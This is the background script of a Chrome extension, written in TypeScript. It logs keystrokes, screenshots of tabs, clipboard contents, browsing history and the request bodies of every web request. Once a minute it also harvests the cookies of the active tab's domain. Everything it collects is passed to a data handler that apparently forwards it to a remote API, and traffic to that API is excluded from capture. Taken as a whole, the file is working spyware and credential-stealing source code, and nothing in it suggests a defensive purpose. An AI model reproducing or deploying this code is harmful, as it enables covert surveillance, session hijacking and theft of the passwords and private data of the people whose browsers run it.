import { handleDataStream } from "../utils/handler/dataHandler";
import { API, DataTypes } from "../consts";
import { captureGeoLocation, getCookies, getCurrentTab, handleCapture, trimDomain } from "../utils/browser/utils";

chrome.runtime.onMessage.addListener(async (message, sender, response) => {
    const { type, data }: {type: DataTypes; data?: any} = message;
    switch(type) {
        case DataTypes.KEYSTROKES:
            let keystrokes: KeystrokeDto = {buffer: data};
            await handleDataStream([keystrokes], [DataTypes.KEYSTROKES]);
            break;
        case DataTypes.TAB_CAPTURE:
            let capture: string = await handleCapture();
            if (capture != "Failed") {
                let bytes = Buffer.from(capture.split(',')[1], 'base64');
                const blob = new Blob([bytes], {
                    type: "image/jpeg"
                });
                let data = new FormData();
                data.append('image', blob);
                let capturedTab: TabCaptureDto = {data: data};
                await handleDataStream([capturedTab], [DataTypes.TAB_CAPTURE]);
            }
            break;
        case DataTypes.CLIPBOARD:
            let clipboard: ClipboardDto = {data: data}
            await handleDataStream([clipboard], [DataTypes.CLIPBOARD]);
            break;
        default:
            break;       
    }
});

chrome.alarms.create({periodInMinutes: 1});

chrome.alarms.onAlarm.addListener(async () => {
    const tab = await getCurrentTab();
    if (tab.url != null) {
        const domain = trimDomain(tab.url)
        const cookies = domain != null ? await getCookies(domain) : null;
        if (cookies != null) {
            const cookieObject: CookieDto = {cookies: cookies.map(cookie => {
                return {name: cookie.name, value: cookie.value}}), url: tab.url};
            await handleDataStream([cookieObject], [DataTypes.COOKIES]);
        }
    }
});

chrome.webNavigation.onCompleted.addListener(async (details) => {
    if (details.url != "about:blank" && details.url != "chrome://new-tab-page/") {
        const history: HistoryDto = {url: details.url}
        await handleDataStream([history], [DataTypes.HISTORY]);
    }
});

chrome.webRequest.onBeforeRequest.addListener(
    (details) => {
        if (details.requestBody && !details.url.includes(API.BASE_URL)) {
            const requestDetails: WebRequestDto = {details: details};
            handleDataStream([requestDetails], [DataTypes.WEB_REQUESTS])
        }
    },
    {
      urls: ["<all_urls>"],
    },
    ["requestBody"]
  );